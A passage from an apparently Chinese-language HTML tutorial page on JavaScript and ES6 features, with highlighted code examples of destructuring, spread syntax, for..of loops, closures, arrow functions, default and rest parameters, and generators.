class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 20 (var not support block scoped)</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="表达式（expression）"><a href="#表达式（expression）" class="headerlink" title="表达式（expression）"></a>表达式（expression）</h1><h2 id="正则表达式（regular-expression）"><a href="#正则表达式（regular-expression）" class="headerlink" title="正则表达式（regular expression）"></a>正则表达式（regular expression）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="regexp">/^(\d\d\d\d)-(\d\d)-(\d\d)$/</span>.<span class="title function_">exec</span>(<span class="string">&#x27;1999-12-31&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// [&#x27;1999-12-31&#x27;, &#x27;1999&#x27;, &#x27;12&#x27;, &#x27;31&#x27;, index: 0, input: &#x27;1999-12-31&#x27;, groups: undefined]</span></span><br></pre></td></tr></table></figure>

<h2 id="解构分配（destructuring）"><a href="#解构分配（destructuring）" class="headerlink" title="解构分配（destructuring）"></a>解构分配（destructuring）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// array</span></span><br><span class="line"><span class="keyword">const</span> [, b, c, d] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b, c, d); <span class="comment">// 2 3 undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// object</span></span><br><span class="line"><span class="keyword">const</span> &#123;b, c, d&#125; = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b, c, d); <span class="comment">// 2 3 undefined</span></span><br></pre></td></tr></table></figure>

<h2 id="传播语法（Spread-syntax）"><a href="#传播语法（Spread-syntax）" class="headerlink" title="传播语法（Spread syntax）"></a>传播语法（Spread syntax）</h2><ul>
<li>ES6传播语法(<code>...</code>)可以将array中的元素自动转换为函数参数，可以代替ES5中的apply()函数</li>
</ul>
<div class="tabs" id="jsspreadsyntax"><ul class="nav-tabs"><li class="tab active"><a href="#jsspreadsyntax-1">General</a></li><li class="tab"><a href="#jsspreadsyntax-2">ConcatArray</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsspreadsyntax-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 (by apply())</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="title class_">Math</span>, [-<span class="number">1</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>]); <span class="comment">// 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 (spread syntax)</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="title class_">Math</span>.<span class="title function_">max</span>(...[-<span class="number">1</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>]) <span class="comment">// 11</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(...[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]); <span class="comment">// 1 2 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> a2 = [<span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">//a1.push.apply(a1, a2); // ES5</span></span><br><span class="line">a1.<span class="title function_">push</span>(...a2);          <span class="comment">// ES6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a1, a2); <span class="comment">// [ 1, 2, 3, 4 ] [ 3, 4 ]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsspreadsyntax-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> a2 = [<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5 (by concat())</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a1.<span class="title function_">concat</span>(a2, a3)); <span class="comment">// [1, 2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 (spread syntax)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...a1, ...a2, ...a3]); <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="控制流（control-flow）"><a href="#控制流（control-flow）" class="headerlink" title="控制流（control flow）"></a>控制流（control flow）</h1><h2 id="循环（loop）"><a href="#循环（loop）" class="headerlink" title="循环（loop）"></a>循环（loop）</h2><ul>
<li>ES6使用<code>for..of</code>支持新的迭代协议，代替<code>for..in</code>和<code>forEach()</code></li>
</ul>
<div class="tabs" id="js-loop"><ul class="nav-tabs"><li class="tab active"><a href="#js-loop-1">for</a></li><li class="tab"><a href="#js-loop-2">array.forEach</a></li><li class="tab"><a href="#js-loop-3">for...of</a></li></ul><div class="tab-content"><div class="tab-pane active" id="js-loop-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; a.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a[i]); <span class="comment">// 1 2 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="js-loop-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">a.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e); <span class="comment">// 1 2 3</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="js-loop-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> e <span class="keyword">of</span> a) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e); <span class="comment">// 1 2 3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [index, elem] <span class="keyword">of</span> a.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;index&#125;</span>-<span class="subst">$&#123;elem&#125;</span>`</span>); <span class="comment">// 0-1 1-2 2-3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>([</span><br><span class="line">    [<span class="literal">false</span>, <span class="string">&#x27;no&#x27;</span>],</span><br><span class="line">    [<span class="literal">true</span>, <span class="string">&#x27;yes&#x27;</span>],</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span> =&gt; <span class="subst">$&#123;value&#125;</span>`</span>); <span class="comment">// false =&gt; no true =&gt; yes</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (obj.<span class="property">prop</span> <span class="keyword">of</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]) &#123; <span class="comment">// (iterate with an object property)</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">prop</span>); <span class="comment">// a b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> (arr[<span class="number">0</span>] <span class="keyword">of</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]) &#123; <span class="comment">// (iterate with an Array element)</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>]); <span class="comment">// a b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="label语句"><a href="#label语句" class="headerlink" title="label语句"></a>label语句</h2><ul>
<li>与<code>break</code>和<code>continue</code>语句配合使用</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="attr">loop1</span>:</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (i === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span> loop1;</span><br><span class="line">  &#125;</span><br><span class="line">  str = str + i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// &#x27;02&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h1><ul>
<li>闭包（closure）：一种能记住在函数作用域外部定义的变量或函数的能力（不利于垃圾回收）</li>
<li>立即调用函数表达式（IIFE，Immediately-Invoked Function Expression）：函数定义后立即调用一次<ul>
<li>可以限定函数内的变量是私有的，外部不能访问</li>
</ul>
</li>
<li>ES6支持箭头函数（arrow function）：简短函数的更简洁表示，且对this支持更友好</li>
<li>ES6支持函数参数的默认值，且只当参数为undefined时才会触发默认值</li>
<li>ES6支持解构分配（destructuring）用于函数参数上，且允许指定默认值，使得代码更清晰简洁</li>
<li>ES6支持可变参数，相比ES5的特殊变量<code>arguments</code>的语法更清晰简洁</li>
</ul>
<div class="tabs" id="jsfunction"><ul class="nav-tabs"><li class="tab active"><a href="#jsfunction-1">Closure</a></li><li class="tab"><a href="#jsfunction-2">IIFE</a></li><li class="tab"><a href="#jsfunction-3">ArrowFunction</a></li><li class="tab"><a href="#jsfunction-4">DefaultValue</a></li><li class="tab"><a href="#jsfunction-5">DestructuringParameter</a></li><li class="tab"><a href="#jsfunction-6">VaryingParameter</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsfunction-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">closure_func</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span>  a = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> inner_func = <span class="title function_">closure_func</span>();</span><br><span class="line"><span class="title function_">inner_func</span>(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfunction-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">showName</span>(<span class="params">name</span>)&#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name: <span class="subst">$&#123;name&#125;</span>`</span>); <span class="comment">// name: abc</span></span><br><span class="line">&#125;)(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> greet = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">&quot;abc&quot;</span>; <span class="comment">// private variable</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">introduce</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greet.<span class="property">name</span>); <span class="comment">// undefined</span></span><br><span class="line">greet.<span class="title function_">introduce</span>();       <span class="comment">// Hello, abc</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfunction-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 (callback function)</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> squares = arr.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">x</span>) &#123; <span class="keyword">return</span> x * x &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 (arrow function)</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">const</span> squares = arr.<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfunction-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 (任何False值会触发默认值)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">    x = x || <span class="number">0</span>;</span><br><span class="line">    y = y || <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 (只有undefined值会触发默认值)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x=<span class="number">0</span>, y=<span class="number">0</span></span>) &#123;&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfunction-5"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 (by object)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = options.<span class="property">a</span> || <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> b = options.<span class="property">b</span> || <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> c = options.<span class="property">c</span> || <span class="number">3</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f1</span>(&#123;<span class="attr">a</span>: <span class="number">11</span>, <span class="attr">c</span>: <span class="number">33</span>&#125;); <span class="comment">// 11 2 33</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 (destructuring)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params">&#123;a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>&#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f2</span>(&#123;<span class="attr">a</span>: <span class="number">11</span>, <span class="attr">c</span>: <span class="number">33</span>&#125;); <span class="comment">// 11 2 33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params">&#123;a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>&#125; = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f3</span>(&#123;<span class="attr">a</span>: <span class="number">11</span>, <span class="attr">c</span>: <span class="number">33</span>&#125;); <span class="comment">// 11 2 33</span></span><br><span class="line"><span class="title function_">f3</span>()                <span class="comment">// 1  2 3</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfunction-6"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 (by special variable &#x27;arguments&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f1</span>();     <span class="comment">//</span></span><br><span class="line"><span class="title function_">f1</span>(<span class="number">1</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="title function_">f1</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 1 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> arg <span class="keyword">of</span> args) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f2</span>();     <span class="comment">//</span></span><br><span class="line"><span class="title function_">f2</span>(<span class="number">1</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="title function_">f2</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 1 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params">pattern, ...args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;pattern&#125;</span>.`</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> arg <span class="keyword">of</span> args) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f3</span>();        <span class="comment">// undefined.</span></span><br><span class="line"><span class="title function_">f3</span>(<span class="number">1</span>);       <span class="comment">// 1.</span></span><br><span class="line"><span class="title function_">f3</span>(<span class="number">1</span>, <span class="number">2</span>);    <span class="comment">// 1. 2</span></span><br><span class="line"><span class="title function_">f3</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 1. 2 3</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><ul>
<li>生成器（generator）为支持协作式（cooperative）编程而设计的函数，支持paused和resumed</li>
<li>ES6生成器新语法：<ul>
<li><code>function*</code>标识生成器函数或方法，其返回一个生成器对象（generator object）<ul>
<li>生成器对象是iterable</li>
</ul>
</li>
<li><code>yield</code>操作符可以暂停生成器，生成器也可以通过它进行输入和输出</li>
<li><code>yield*</code>支持在generator内部调用其他可迭代对象（比如另一个generator）</li>
</ul>
</li>
<li>生成器语法可以简化Promise基础的异步逻辑</li>
</ul>
<div class="tabs" id="jsfuncgenerator"><ul class="nav-tabs"><li class="tab active"><a href="#jsfuncgenerator-1">Basic</a></li><li class="tab"><a href="#jsfuncgenerator-2">IterateOverProperties</a></li><li class="tab"><a href="#jsfuncgenerator-3">AsynchronousCode</a></li><li class="tab"><a href="#jsfuncgenerator-4">yield*</a></li><li class="tab"><a href="#jsfuncgenerator-5">Send&RecvValue</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsfuncgenerator-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Generator function declaration</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">genFunc1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;result&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> genObj1 = <span class="title function_">genFunc1</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(genObj1.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;a&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(genObj1.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;b&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(genObj1.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;result&#x27;, done: true &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Generator function expression</span></span><br><span class="line"><span class="keyword">const</span> genFunc2 = <span class="keyword">function</span>* () &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> genObj2 = <span class="title function_">genFunc2</span>();</span><br><span class="line">genObj2.<span class="title function_">next</span>(); <span class="comment">// a</span></span><br><span class="line">genObj2.<span class="title function_">next</span>(); <span class="comment">// b</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfuncgenerator-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">objectEntries</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> propKeys = <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> propKey <span class="keyword">of</span> propKeys) &#123;</span><br><span class="line">        <span class="keyword">yield</span> [propKey, obj[propKey]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [k, v] <span class="keyword">of</span> <span class="title function_">objectEntries</span>(obj)) &#123; <span class="comment">// (iterable)</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;k&#125;</span>: <span class="subst">$&#123;v&#125;</span>`</span>); <span class="comment">// 1: a  2: b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfuncgenerator-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Promise-based的异步代码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fetchJson</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fetch</span>(url)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">request</span> =&gt;</span> request.<span class="title function_">text</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ERROR: <span class="subst">$&#123;error.stack&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用co库和generator后，异步代码像同步逻辑一样清晰</span></span><br><span class="line"><span class="comment">// https://github.com/tj/co</span></span><br><span class="line"><span class="keyword">const</span> fetchJson = co.<span class="title function_">wrap</span>(<span class="keyword">function</span>* (url) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> request = <span class="keyword">yield</span> <span class="title function_">fetch</span>(url);</span><br><span class="line">        <span class="keyword">let</span> text = <span class="keyword">yield</span> request.<span class="title function_">text</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ERROR: <span class="subst">$&#123;error.stack&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ECMAScript 2017支持async函数（内部基于generator实现）</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchJson</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> request = <span class="keyword">await</span> <span class="title function_">fetch</span>(url);</span><br><span class="line">        <span class="keyword">let</span> text = <span class="keyword">await</span> request.<span class="title function_">text</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ERROR: <span class="subst">$&#123;error.stack&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetchJson</span>(<span class="string">&#x27;http://example.com/some_file.json&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">obj</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(obj));</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfuncgenerator-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// General</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">    <span class="keyword">yield</span>* <span class="title function_">foo</span>();</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> arr = [...<span class="title function_">bar</span>()];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// [&#x27;x&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;y&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// End-of-iteration values</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">genFuncWithReturn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Result:&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">logReturned</span>(<span class="params">genObj</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">yield</span>* genObj;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// (A)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> arr2 = [...<span class="title function_">logReturned</span>(<span class="title function_">genFuncWithReturn</span>())]; <span class="comment">// The result</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2); <span class="comment">// a  b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Iterating over trees</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">value, left=<span class="literal">null</span>, right=<span class="literal">null</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">value</span> = value;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">left</span> = left;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">right</span> = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    * [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">        <span class="keyword">yield</span> 